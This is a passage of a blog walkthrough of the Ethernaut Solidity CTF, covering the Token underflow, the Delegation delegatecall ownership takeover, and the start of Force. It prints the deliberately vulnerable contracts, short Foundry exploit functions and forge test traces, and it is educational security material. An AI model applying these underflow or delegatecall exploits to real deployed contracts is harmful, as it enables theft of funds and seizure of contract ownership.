<code>solidity &lt;0.8</code> behavior, we have to slightly modify the code of
this challenge and wrap arithmetics with the <code>unchecked</code>
statement:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">transfer</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_to</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">_value</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">unchecked</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-</span> <span style="color:#434f54">_value</span> <span style="color:#728e00">&gt;=</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-=</span> <span style="color:#434f54">_value</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">balances</span>[<span style="color:#434f54">_to</span>] <span style="color:#728e00">+=</span> <span style="color:#434f54">_value</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The exploit is simple:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#8a7b52">0</span>), <span style="color:#8a7b52">21</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract TokenTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Token.t.sol:TokenTest
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testToken<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 319929<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>319929<span style="color:#728e00">]</span> TokenTest::testToken<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>244552<span style="color:#728e00">]</span> TokenTest::create<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>232204<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>TokenFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>180641<span style="color:#728e00">]</span> TokenFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>120540<span style="color:#728e00">]</span> → new Token@<span style="color:#7f8c8d">&#34;0x037f…dd8f&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">380</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>22893<span style="color:#728e00">]</span> Token::transfer<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 20<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Token: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: Token: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← Token: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← Token: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>22893<span style="color:#728e00">]</span> Token::transfer<span style="color:#728e00">(</span>0x0000000000000000000000000000000000000000, 21<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>4586<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>Token: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>1539<span style="color:#728e00">]</span> TokenFactory::validateInstance<span style="color:#728e00">(</span>Token: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>529<span style="color:#728e00">]</span> Token::balanceOf<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ <span style="color:#8a7b52">115792089237316195423570985008687907853269984665640564039457584007913129639935</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: TokenFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Test result: ok. <span style="color:#8a7b52">1</span> passed; <span style="color:#8a7b52">0</span> failed; finished in 1.00ms
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Lessons learned</p>
<p>In Solidity <code>&lt;0.8</code> use
<a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath"  class="external-link" target="_blank" rel="noopener">SafeMath</a>
from OpenZeppelin, which provides wrappers over Solidity’s
arithmetic operations.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://solidity-by-example.org/hacks/overflow/"  class="external-link" target="_blank" rel="noopener">Arithmetic
Overflow and Underflow</a> from Solidity by Example.</li>
<li><a href="https://youtu.be/zqHb-ipbmIo"  class="external-link" target="_blank" rel="noopener">Arithmetic Overflow and Underflow | Hack Solidity (0.6)</a>
&ndash; YouTube video from Smart Contract Programmer.</li>
</ul>
<hr>
<p>The full code
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-6/src/test/Token.t.sol"  class="external-link" target="_blank" rel="noopener">is
here</a>. Let&rsquo;s continue to the <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-7-delegation" >Ethernaut, #7 Delegation</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #7 Delegation</p>
<p>The goals is to claim the ownership of the <code>Delegate</code> contract.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegate</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_owner</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_owner</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">pwn</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegation</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Delegate</span> <span style="color:#434f54">delegate</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_delegateAddress</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">delegate</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Delegate</span>(<span style="color:#434f54">_delegateAddress</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">fallback</span>() <span style="color:#728e00">external</span> {
</span></span><span style="display:flex;"><span>        (<span style="color:#00979d">bool</span> <span style="color:#434f54">result</span>, ) <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">delegate</span>).<span style="color:#728e00">delegatecall</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">data</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">result</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">this</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>We have two contracts: the <code>Delegate</code> and the <code>Delegation</code>.</p>
<p><strong>Delegate</strong></p>
<ul>
<li>It has an <code>owner</code> that was set in the constructor.</li>
<li>The <code>pwn()</code> public function can be used to change the ownership to the <code>msg.sender</code>.</li>
</ul>
<p><strong>Delegation</strong></p>
<ul>
<li>It keeps a reference to the <code>delegate</code> instance.</li>
<li>Its <code>fallback</code> function calls the <code>delegatecall(msg.data)</code> on
the <code>delegate</code> instance.</li>
</ul>
<p>There are a few differences between a simple message-<code>call</code> and
a <code>delegatecall</code>. The <code>delegatecall</code> is a
<a href="https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries"  class="external-link" target="_blank" rel="noopener">special
variant of a message call</a>, which executes the code at the
target address in the context of the calling contract. The
<code>msg.sender</code>, <code>msg.data</code> and <code>msg.value</code> are preserved. This
makes it possible to use other contracts as libraries.</p>
 <div class="mermaid">
<p>%%{init: {&rsquo;theme&rsquo;: &rsquo;neutral&rsquo; }}%%
sequenceDiagram
participant E as Exploit
participant D1 as Delegation
participant D2 as Delegate
E-&raquo;D1: call(abi.encodeWithSignature(&ldquo;pwn()&rdquo;))
D1-&raquo;D1: fallback()
D1-&raquo;D2: delegatecall(msg.data)
Note right of D1: msg.data = &ldquo;pwn()&rdquo;
Note right of D1: msg.sender = Exploit
Note right of D2: msg.sender = Exploit
D2-&raquo;D2: owner = msg.sender</p>
 </div>
<p>The <code>msg.data</code> should be an ABI-encoded function signature. This
could be done by using either of the following functions:</p>
<ul>
<li><code>abi.encodeWithSelector(bytes4 selector, ...)</code></li>
<li><code>abi.encodeWithSignature(string memory signature, ...)</code></li>
</ul>
<p>The EVM stores contract&rsquo;s state variables in slots in the order
they are defined. Because in both of these contracts the <code>owner</code>
state variable is defined first (assigned to <code>slot 0</code>), it is
possible call the <code>pwn()</code> function to change its value.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegate</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>; <span style="color:#95a5a6">// slot = 0
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegation</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>; <span style="color:#95a5a6">// slot = 0
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">Delegate</span> <span style="color:#434f54">delegate</span>;    <span style="color:#95a5a6">// slot = 1
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>}
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>To become an owner of the <code>Delegate</code> contract we need to <code>call</code>
the <code>fallback</code> function of the <code>Delegation</code> contract with the
<code>msg.data</code> set to the encoded signature of the <code>pwn()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes</span> <span style="color:#728e00">memory</span> <span style="color:#728e00">data</span> <span style="color:#728e00">=</span> <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSelector</span>(<span style="color:#434f54">Delegate</span>.<span style="color:#434f54">pwn</span>.<span style="color:#728e00">selector</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>).<span style="color:#728e00">call</span>(<span style="color:#728e00">data</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Or using the equivalent ABI-encoding approach:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">bytes</span> <span style="color:#728e00">memory</span> <span style="color:#728e00">data</span> <span style="color:#728e00">=</span> <span style="color:#728e00">abi</span>.<span style="color:#728e00">encodeWithSignature</span>(<span style="color:#7f8c8d">&#34;pwn()&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>).<span style="color:#728e00">call</span>(<span style="color:#728e00">data</span>)
</span></span></code></pre></div><p>The trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract DelegationTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Delegation.t.sol:DelegationTest
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testDelegation<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 248446<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>248446<span style="color:#728e00">]</span> DelegationTest::testDelegation<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>191772<span style="color:#728e00">]</span> DelegationTest::create<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>179424<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>DelegationFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>127861<span style="color:#728e00">]</span> DelegationFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>93165<span style="color:#728e00">]</span> → new Delegation@<span style="color:#7f8c8d">&#34;0x566b…cc21&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">243</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>303<span style="color:#728e00">]</span> Delegation::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← DelegationFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>3350<span style="color:#728e00">]</span> Delegation::pwn<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>367<span style="color:#728e00">]</span> Delegate::pwn<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>delegatecall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>4346<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>1299<span style="color:#728e00">]</span> DelegationFactory::validateInstance<span style="color:#728e00">(</span>Delegation: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>303<span style="color:#728e00">]</span> Delegation::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: DelegationFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div><p>Note that if the order of the state variables were different in the
<code>Delegation</code> contract then this would not work:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Delegation</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Delegate</span> <span style="color:#434f54">delegate</span>;     <span style="color:#95a5a6">// slot = 0
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;  <span style="color:#95a5a6">// slot = 1
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#95a5a6">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>}
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://solidity-by-example.org/call/"  class="external-link" target="_blank" rel="noopener">Call</a> from Solidity
by Example.</li>
<li><a href="https://solidity-by-example.org/delegatecall/"  class="external-link" target="_blank" rel="noopener">Delegatecall</a> from Solidity by Example.</li>
<li><a href="https://docs.soliditylang.org/en/v0.8.15/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries"  class="external-link" target="_blank" rel="noopener">Delegatecall
/ Callcode and Libraries</a> from Solidity docs.</li>
<li><a href="https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#layout-of-state-variables-in-storage"  class="external-link" target="_blank" rel="noopener">Layout
of State Variables in Storage</a> from Solidity docs.</li>
</ul>
<hr>
<p>Code for this step is in branch
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-7/src/test/Delegation.t.sol"  class="external-link" target="_blank" rel="noopener">step-7</a>.</p>
<p>Let&rsquo;s continue to the next challenge:
<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-8-force" >Ethernaut, #8 Force</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #8 Force</p>
<p>To complete this challenge we need to make the balance of the
<code>Force</code> contract greater than zero.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Force</span> {<span style="color:#95a5a6">/*
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">                   MEOW ?
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">         /\_/\   /
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    ____/ o o \
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">  /~____  =ø= /
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"> (______)__m_m)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">*/</span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Thoughts</p>
<p>The contract has nothing in it, except the ASCII-art of a cat.
It doesn&rsquo;t have a
<a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#receive-ether-function"  class="external-link" target="_blank" rel="noopener">receive</a>,
<a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#fallback-function"  class="external-link" target="_blank" rel="noopener">fallback</a>
function, or any other
<a href="https://solidity-by-example.org/payable/"  class="external-link" target="_blank" rel="noopener">payable</a> function:</p>
<p><em>If neither a <code>receive</code> Ether nor a payable <code>fallback</code> function is
present, the contract cannot receive Ether through regular transactions and throws an exception.</em> &ndash; <a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#receive-ether-function"  class="external-link" target="_blank" rel="noopener">Solidity
docs</a></p>
<p>At first glance, it looks like we can&rsquo;t send ETH to it, but
actually, we can.</p>
<p>There are 6 ways to send ETH to a contract:</p>
<ul>
<li>via <code>receive</code></li>
<li>via <code>fallback</code></li>
<li>by using <code>payable</code> functions.</li>
<li>by receiving miner block rewards &ndash; contracts can be
recipients of the mining block rewards.</li>
<li>contracts can receive ETH even before they are created &ndash; we
can
<a href="https://solidity-by-example.org/app/create2/"  class="external-link" target="_blank" rel="noopener">pre-compute
the deployment address</a> using <code>CREATE2</code>.</li>
<li>by <code>selfdestruct</code>&lsquo;ing a contract &ndash; the remaining Ether stored
in a contract is sent to a designated address. This is what we
are going to use for exploit.</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>We need a temporary contract that will send its funds to the
